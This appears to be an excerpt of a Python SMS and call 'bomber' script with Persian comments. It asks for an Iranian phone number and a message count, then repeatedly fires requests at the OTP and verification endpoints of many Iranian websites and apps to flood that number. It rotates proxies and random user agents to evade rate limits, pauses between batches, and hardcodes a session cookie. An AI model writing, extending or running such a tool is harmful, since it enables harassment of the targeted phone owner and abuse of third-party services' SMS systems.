...
def check_and_import(modules: dict):
    ...
    for pkg_name, pkg_install in modules.items():
        try:
            ...
            print(f"⚠️  {pkg_name} package not found {pkg_install} ...")
...
def contact_disp():
    ...
    if path.exists("./contacts.txt"):
        ...
        contacts.sort(key=lambda x: list(x.keys())[0].lower())

        # ساخت خروجی تمیز با اینتر
        output = ""
        for c in contacts:
            output += f"{c}\n"       # یک خط مخاطب
        return output.rstrip()       # حذف اینتر اضافه آخر
  

if path.exists("./contacts.txt"):
    is_contact = F"{Fore.GREEN}Enable"
else:
    is_contact = f"{Fore.RED}Disable"
...
class Handler:
    ...
    def launcher(self, func: callable, num: str, proxies: Union[dict, None]):
        ...
        global sent
        try:
            func(num, proxies)  # بدون return
            print(f"{Col.green}[+]{Fore.LIGHTMAGENTA_EX} Sent {func.__name__} {sent} sended")
            counter += 1
            sent += 1
            if sent >= count:
                print("\n" + Fore.BLUE, "Exiting...")
            ...
            print(f"{Col.red}[-]{Fore.LIGHTBLACK_EX} Failed {func.__name__}: {e}")
...
def get_proxy():
    if proxy_state():
        with open("proxies.txt") as file:
            ...
            return choice(lines) if len(lines) != 0 else None

def get_input(text: str, checker: callable = lambda x: True):
    v = input(text)
    while not checker(v):
...
# ------------------ Start Function اصلاح شده با تایمر batch -------------------
def start(choice_str: str, number: str, spam_count: int = 10, proxies: Optional[dict] = None):
    global sent
    if proxy_state():
        proxies = {"http": get_proxy(), "https": get_proxy()}

    func_dict = {"call": handler.send_call, "sms": handler.send_sms}
    api_list = handler.sms if choice_str == "sms" else handler.call

    print(f"{Col.yellow}[!]{Col.green} Started sending {choice_str} with {Fore.LIGHTCYAN_EX}{len(api_list)}{Col.green} APIs")
    ...
    while sent < spam_count:
        for func in api_list:
            if sent >= spam_count:
                break
            func_dict[choice_str](number, proxies)
            sent += 1

        # ---------- Batch Wait Timer (بعد از تمام APIها) ----------
        if sent < spam_count:  # فقط اگر هنوز اسپم بیشتر داریم
            import sys, time

            def wait_timer(seconds=150):
                """تایمر عقب افتاده بین batch ها با نمایش پیشرفت"""
                ...
                while True:
                    ...
                    sys.stdout.write(f"\r[!] توقف بین batch ها: {percent}% - زمان باقی‌مانده: {remaining:.0f}s ")
                    sys.stdout.flush()
                    time.sleep(0.5)
                print("\n[!] آماده اجرای batch بعدی")

            wait_timer(149)  # 2 دقیقه و 29 ثانیه
...
if __name__ == "__main__":
    ...
    try:
        choices = {"1": "call", "2": "sms"}
        print(f"{Col.yellow}[!]{Col.gray} Proxies are {'Enabled' if proxy_state() else 'Disabled'}")
        print(f"{Col.yellow}[!]{Col.gray} Contact maneger is{Col.gray} {is_contact}")
        if is_contact == f"{Fore.GREEN}Enable" :
            print(f"{Col.yellow}[*]{Fore.CYAN} Contacts :\n{contact_disp()}")
        print(f"{Col.yellow}[!]{Col.gray} Choices:")
        for ch in choices: print(f"   {Fore.CYAN}{ch}- {Fore.GREEN}{choices[ch].capitalize()} Bomber ")
        print()

        choice_str = get_input(f"{Fore.CYAN}[=]{Col.gray} Enter Your Choice: {Col.green}", lambda x: x in choices)
        number = get_input(f"{Fore.CYAN}[=]{Col.gray} Enter the phone number [9xxxxxxxxx]: {Col.green}",
                           checker=lambda x: x.isnumeric() and x.startswith("9") and len(x) == 10)
        count = int(get_input(f"{Fore.CYAN}[=]{Col.gray} Enter spam count: {Col.green}", lambda x: x.isnumeric() and int(x) > 0))
        my_counter = count
    ...
    def setup_api():
        ...
        def snapptrip(num, proxies):
            sTripH = {
                ...
                "Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530",
                "TE": "Trailers"
            }
            sTripD = {
                "lang": "fa",
        ...
        def snapmarket(num, proxies):
            post(proxies=proxies, url="https://account.api.balad.ir/api/web/auth/login/",
                json={"phone_number": f'0{num}', "os_type": "W"})
...
###---------------------------------- APIs --------------------------------###
        ...
        @handler.sms_api
        def shahriariran(num, proxies):
            post(proxies=proxies, url="https://panel.shahriareiran.com/api/v2/auth/request",
                            json={"phone":f'0{num}' })
        @handler.sms_api
        ...
        @handler.sms_api
        def shad_sim(num, proxies):
                n4 = {"phone":f"+98{num}"}
                rhead = {'Host': 'sim.shad.ir',"User-Agent": generate_user_agent(os="win"),'Origin': 'https://sim.shad.ir', 'Content-Type': 'application/json',}
                post(proxies=proxies, url="https://sim.shad.ir/backend/api/v1/otp/send-otp",data=n4, headers=rhead)
        ...
        @handler.sms_api
        def saharparts(num, proxies):
            post("https://saharparts.ir/customer_register.php",headers={"X-Requested-With":"XMLHttpRequest"},data={"action":"send_verification_code","mobile":f"0{num}"})
    ...
    start(choices[choice_str], number, count)

    print(f"{Fore.LIGHTBLUE_EX}All tasks completed. Exiting...")
